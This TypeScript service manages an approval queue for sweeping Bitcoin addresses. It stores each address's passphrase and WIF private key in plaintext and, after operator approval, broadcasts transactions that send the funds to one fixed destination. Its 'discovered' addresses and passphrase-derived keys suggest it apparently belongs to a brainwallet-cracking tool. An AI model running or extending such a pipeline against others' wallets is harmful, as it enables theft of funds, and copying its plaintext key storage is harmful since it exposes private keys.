import { db } from "./db";
import { pendingSweeps, sweepAuditLog, type PendingSweep, type InsertPendingSweep, type SweepStatus } from "@shared/schema";
import { eq, desc, and, or, sql } from "drizzle-orm";
import { bitcoinSweepService } from "./bitcoin-sweep";

interface CreatePendingSweepOptions {
  address: string;
  passphrase: string;
  wif: string;
  isCompressed: boolean;
  balanceSats: number;
  source?: "typescript" | "python" | "manual";
  recoveryType?: string;
}

interface SweepApprovalResult {
  success: boolean;
  error?: string;
  txId?: string;
  txHex?: string;
}

class SweepApprovalService {
  constructor() {
    console.log("[SweepApproval] Service initialized - manual approval required for all sweeps");
  }

  async createPendingSweep(options: CreatePendingSweepOptions): Promise<PendingSweep | null> {
    if (!db) {
      console.error("[SweepApproval] Database not available");
      return null;
    }
    
    try {
      const existing = await db
        .select()
        .from(pendingSweeps)
        .where(and(
          eq(pendingSweeps.address, options.address),
          or(
            eq(pendingSweeps.status, "pending"),
            eq(pendingSweeps.status, "approved")
          )
        ))
        .limit(1);

      if (existing.length > 0) {
        console.log(`[SweepApproval] Address ${options.address.slice(0, 15)}... already has pending sweep`);
        return existing[0];
      }

      const balanceBtc = (options.balanceSats / 100000000).toFixed(8);
      
      let estimatedFeeSats = 0;
      let netAmountSats = options.balanceSats;
      let utxoCount = 0;
      
      try {
        const estimate = await bitcoinSweepService.estimateSweep(options.address);
        if (estimate.canSweep) {
          estimatedFeeSats = estimate.estimatedFee;
          netAmountSats = estimate.estimatedOutput;
          utxoCount = estimate.utxoCount;
        }
      } catch (e) {
        console.log(`[SweepApproval] Could not estimate fees for ${options.address.slice(0, 15)}...`);
      }

      const insertData: InsertPendingSweep = {
        address: options.address,
        passphrase: options.passphrase,
        wif: options.wif,
        isCompressed: options.isCompressed,
        balanceSats: options.balanceSats,
        balanceBtc,
        estimatedFeeSats,
        netAmountSats,
        utxoCount,
        status: "pending",
        source: options.source || "typescript",
        recoveryType: options.recoveryType,
        destinationAddress: bitcoinSweepService.getDestinationAddress(),
      };

      const [result] = await db.insert(pendingSweeps).values(insertData).returning();

      await this.logAuditEvent(result.id, "created", null, "pending", "system", 
        `Balance: ${balanceBtc} BTC, Source: ${options.source || "typescript"}`);

      console.log(`\n🔔 [PENDING SWEEP] ${options.address}`);
      console.log(`   💰 Balance: ${balanceBtc} BTC (${options.balanceSats} sats)`);
      console.log(`   💸 Est. Fee: ${estimatedFeeSats} sats`);
      console.log(`   💵 Net: ${(netAmountSats / 100000000).toFixed(8)} BTC`);
      console.log(`   🔑 Source: ${options.source || "typescript"}`);
      console.log(`   ⏳ Status: AWAITING MANUAL APPROVAL`);
      console.log(`   📝 Use /api/sweeps/approve/${result.id} to approve\n`);

      return result;
    } catch (error) {
      console.error("[SweepApproval] Error creating pending sweep:", error);
      return null;
    }
  }

  async getPendingSweeps(status?: SweepStatus): Promise<PendingSweep[]> {
    if (!db) return [];
    
    try {
      if (status) {
        return await db
          .select()
          .from(pendingSweeps)
          .where(eq(pendingSweeps.status, status))
          .orderBy(desc(pendingSweeps.balanceSats));
      }
      return await db
        .select()
        .from(pendingSweeps)
        .orderBy(desc(pendingSweeps.discoveredAt));
    } catch (error) {
      console.error("[SweepApproval] Error getting pending sweeps:", error);
      return [];
    }
  }

  async getSweepById(id: string): Promise<PendingSweep | null> {
    if (!db) return null;
    
    try {
      const [result] = await db
        .select()
        .from(pendingSweeps)
        .where(eq(pendingSweeps.id, id))
        .limit(1);
      return result || null;
    } catch (error) {
      console.error("[SweepApproval] Error getting sweep by id:", error);
      return null;
    }
  }

  async approveSweep(id: string, approvedBy: string = "operator"): Promise<SweepApprovalResult> {
    if (!db) return { success: false, error: "Database not available" };
    
    try {
      const sweep = await this.getSweepById(id);
      if (!sweep) {
        return { success: false, error: "Sweep not found" };
      }

      if (sweep.status !== "pending") {
        return { success: false, error: `Sweep is not pending (current status: ${sweep.status})` };
      }

      await db
        .update(pendingSweeps)
        .set({
          status: "approved",
          approvedAt: new Date(),
          approvedBy,
          updatedAt: new Date(),
        })
        .where(eq(pendingSweeps.id, id));

      await this.logAuditEvent(id, "approved", "pending", "approved", approvedBy,
        `Approved for broadcast`);

      console.log(`\n✅ [SWEEP APPROVED] ${sweep.address}`);
      console.log(`   💰 Balance: ${sweep.balanceBtc} BTC`);
      console.log(`   👤 Approved by: ${approvedBy}`);
      console.log(`   ⏳ Ready for broadcast - use /api/sweeps/broadcast/${id}\n`);

      return { success: true };
    } catch (error) {
      console.error("[SweepApproval] Error approving sweep:", error);
      return { success: false, error: error instanceof Error ? error.message : "Unknown error" };
    }
  }

  async broadcastSweep(id: string): Promise<SweepApprovalResult> {
    if (!db) return { success: false, error: "Database not available" };
    
    try {
      const sweep = await this.getSweepById(id);
      if (!sweep) {
        return { success: false, error: "Sweep not found" };
      }

      if (sweep.status !== "approved") {
        return { success: false, error: `Sweep must be approved first (current status: ${sweep.status})` };
      }

      await db
        .update(pendingSweeps)
        .set({
          status: "broadcasting",
          broadcastAt: new Date(),
          updatedAt: new Date(),
        })
        .where(eq(pendingSweeps.id, id));

      await this.logAuditEvent(id, "broadcast_started", "approved", "broadcasting", "system",
        "Starting transaction broadcast");

      const result = await bitcoinSweepService.sweep(
        sweep.wif,
        sweep.address
      );

      if (result.success && result.txId) {
        await db
          .update(pendingSweeps)
          .set({
            status: "completed",
            txId: result.txId,
            txHex: result.txHex,
            completedAt: new Date(),
            updatedAt: new Date(),
          })
          .where(eq(pendingSweeps.id, id));

        await this.logAuditEvent(id, "completed", "broadcasting", "completed", "system",
          `TX: ${result.txId}`);

        console.log(`\n🎉 [SWEEP COMPLETED] ${sweep.address}`);
        console.log(`   💰 Amount: ${sweep.balanceBtc} BTC`);
        console.log(`   📤 TX ID: ${result.txId}`);
        console.log(`   🔗 ${result.details?.explorerUrl || ""}\n`);

        return {
          success: true,
          txId: result.txId,
          txHex: result.txHex,
        };
      } else {
        await db
          .update(pendingSweeps)
          .set({
            status: "failed",
            errorMessage: result.error,
            updatedAt: new Date(),
          })
          .where(eq(pendingSweeps.id, id));

        await this.logAuditEvent(id, "failed", "broadcasting", "failed", "system",
          `Error: ${result.error}`);

        return {
          success: false,
          error: result.error,
        };
      }
    } catch (error) {
      console.error("[SweepApproval] Error broadcasting sweep:", error);
      
      if (db) {
        await db
          .update(pendingSweeps)
          .set({
            status: "failed",
            errorMessage: error instanceof Error ? error.message : "Unknown error",
            updatedAt: new Date(),
          })
          .where(eq(pendingSweeps.id, id));
      }

      return { success: false, error: error instanceof Error ? error.message : "Unknown error" };
    }
  }

  async rejectSweep(id: string, reason: string = "Manual rejection"): Promise<SweepApprovalResult> {
    if (!db) return { success: false, error: "Database not available" };
    
    try {
      const sweep = await this.getSweepById(id);
      if (!sweep) {
        return { success: false, error: "Sweep not found" };
      }

      if (sweep.status !== "pending") {
        return { success: false, error: `Can only reject pending sweeps (current status: ${sweep.status})` };
      }

      await db
        .update(pendingSweeps)
        .set({
          status: "rejected",
          errorMessage: reason,
          updatedAt: new Date(),
        })
        .where(eq(pendingSweeps.id, id));

      await this.logAuditEvent(id, "rejected", "pending", "rejected", "operator", reason);

      console.log(`\n❌ [SWEEP REJECTED] ${sweep.address}`);
      console.log(`   💰 Balance: ${sweep.balanceBtc} BTC`);
      console.log(`   📝 Reason: ${reason}\n`);

      return { success: true };
    } catch (error) {
      console.error("[SweepApproval] Error rejecting sweep:", error);
      return { success: false, error: error instanceof Error ? error.message : "Unknown error" };
    }
  }

  async refreshBalance(id: string): Promise<{ success: boolean; newBalance?: number; error?: string }> {
    if (!db) return { success: false, error: "Database not available" };
    
    try {
      const sweep = await this.getSweepById(id);
      if (!sweep) {
        return { success: false, error: "Sweep not found" };
      }

      const estimate = await bitcoinSweepService.estimateSweep(sweep.address);

      if (!estimate.canSweep) {
        if (sweep.status === "pending") {
          await db
            .update(pendingSweeps)
            .set({
              status: "expired",
              errorMessage: estimate.error || "Balance no longer available",
              updatedAt: new Date(),
            })
            .where(eq(pendingSweeps.id, id));

          await this.logAuditEvent(id, "expired", sweep.status, "expired", "system",
            "Balance no longer available on refresh");
        }
        return { success: false, error: estimate.error || "No UTXOs available" };
      }

      const newBalance = estimate.totalBalance;
      
      await db
        .update(pendingSweeps)
        .set({
          balanceSats: newBalance,
          balanceBtc: (newBalance / 100000000).toFixed(8),
          estimatedFeeSats: estimate.estimatedFee,
          netAmountSats: estimate.estimatedOutput,
          utxoCount: estimate.utxoCount,
          updatedAt: new Date(),
        })
        .where(eq(pendingSweeps.id, id));

      return { success: true, newBalance };
    } catch (error) {
      console.error("[SweepApproval] Error refreshing balance:", error);
      return { success: false, error: error instanceof Error ? error.message : "Unknown error" };
    }
  }

  async getStats(): Promise<{
    pending: number;
    approved: number;
    completed: number;
    failed: number;
    rejected: number;
    totalPendingBtc: string;
    totalSweptBtc: string;
  }> {
    if (!db) {
      return {
        pending: 0,
        approved: 0,
        completed: 0,
        failed: 0,
        rejected: 0,
        totalPendingBtc: "0.00000000",
        totalSweptBtc: "0.00000000",
      };
    }
    
    try {
      const counts = await db
        .select({
          status: pendingSweeps.status,
          count: sql<number>`count(*)::int`,
          totalSats: sql<number>`COALESCE(sum(${pendingSweeps.balanceSats}), 0)::bigint`,
        })
        .from(pendingSweeps)
        .groupBy(pendingSweeps.status);

      const stats = {
        pending: 0,
        approved: 0,
        completed: 0,
        failed: 0,
        rejected: 0,
        totalPendingBtc: "0.00000000",
        totalSweptBtc: "0.00000000",
      };

      let pendingSats = 0;
      let sweptSats = 0;

      for (const row of counts) {
        const count = Number(row.count);
        const totalSats = Number(row.totalSats);
        
        switch (row.status) {
          case "pending":
            stats.pending = count;
            pendingSats += totalSats;
            break;
          case "approved":
            stats.approved = count;
            pendingSats += totalSats;
            break;
          case "completed":
            stats.completed = count;
            sweptSats += totalSats;
            break;
          case "failed":
            stats.failed = count;
            break;
          case "rejected":
            stats.rejected = count;
            break;
        }
      }

      stats.totalPendingBtc = (pendingSats / 100000000).toFixed(8);
      stats.totalSweptBtc = (sweptSats / 100000000).toFixed(8);

      return stats;
    } catch (error) {
      console.error("[SweepApproval] Error getting stats:", error);
      return {
        pending: 0,
        approved: 0,
        completed: 0,
        failed: 0,
        rejected: 0,
        totalPendingBtc: "0.00000000",
        totalSweptBtc: "0.00000000",
      };
    }
  }

  async getAuditLog(sweepId?: string): Promise<Array<{
    id: string;
    sweepId: string | null;
    action: string;
    previousStatus: string | null;
    newStatus: string | null;
    actor: string | null;
    details: string | null;
    timestamp: Date | null;
  }>> {
    if (!db) return [];
    
    try {
      if (sweepId) {
        return await db
          .select()
          .from(sweepAuditLog)
          .where(eq(sweepAuditLog.sweepId, sweepId))
          .orderBy(desc(sweepAuditLog.timestamp));
      }
      return await db
        .select()
        .from(sweepAuditLog)
        .orderBy(desc(sweepAuditLog.timestamp))
        .limit(100);
    } catch (error) {
      console.error("[SweepApproval] Error getting audit log:", error);
      return [];
    }
  }

  private async logAuditEvent(
    sweepId: string,
    action: string,
    previousStatus: string | null,
    newStatus: string,
    actor: string,
    details: string
  ): Promise<void> {
    if (!db) return;
    
    try {
      await db.insert(sweepAuditLog).values({
        sweepId,
        action,
        previousStatus,
        newStatus,
        actor,
        details,
      });
    } catch (error) {
      console.error("[SweepApproval] Error logging audit event:", error);
    }
  }
}

export const sweepApprovalService = new SweepApprovalService();
